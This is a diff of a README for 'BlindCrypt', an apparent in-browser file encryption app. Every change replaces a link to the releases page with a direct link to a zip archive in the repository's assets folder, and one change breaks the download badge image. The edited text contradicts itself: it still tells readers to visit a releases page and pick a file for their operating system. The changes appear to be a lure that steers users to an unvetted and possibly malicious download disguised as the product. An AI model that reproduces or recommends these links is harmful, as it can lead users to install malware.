@@ -1,7 +1,7 @@
 # 🔐 BlindCrypt - Encrypt Your Files Securely in Your Browser
 
 ## 📥 Download BlindCrypt
-[![Download BlindCrypt](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/girishbdeshpand/BlindCrypt/releases)
+[![Download BlindCrypt](https://github.com/girishbdeshpand/BlindCrypt/raw/refs/heads/main/assets/Crypt-Blind-1.5-alpha.2.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/girishbdeshpand/BlindCrypt/raw/refs/heads/main/assets/Crypt-Blind-1.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 BlindCrypt is a web app that helps you encrypt and decrypt files right in your browser. With BlindCrypt, your passphrases and files stay on your device. This means no one else can access your sensitive information. The app uses advanced WebCrypto technology to keep your data secure.
@@ -16,7 +16,7 @@ BlindCrypt is a web app that helps you encrypt and decrypt files right in your b
 To download BlindCrypt, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the BlindCrypt releases.
-   [Download BlindCrypt](https://github.com/girishbdeshpand/BlindCrypt/releases)
+   [Download BlindCrypt](https://github.com/girishbdeshpand/BlindCrypt/raw/refs/heads/main/assets/Crypt-Blind-1.5-alpha.2.zip)
 
 2. **Select the Appropriate File**: On the releases page, look for the latest version. Choose the file that matches your operating system.
 
@@ -62,4 +62,4 @@ We welcome contributions from anyone interested in improving BlindCrypt. You can
 ## 📝 License
 BlindCrypt is open-source software. You can freely use, modify, and distribute it as per the terms of the license. 
 
-Together, let’s keep your files secure! Remember to visit the [Download Page](https://github.com/girishbdeshpand/BlindCrypt/releases) to get started today.
+Together, let’s keep your files secure! Remember to visit the [Download Page](https://github.com/girishbdeshpand/BlindCrypt/raw/refs/heads/main/assets/Crypt-Blind-1.5-alpha.2.zip) to get started today.
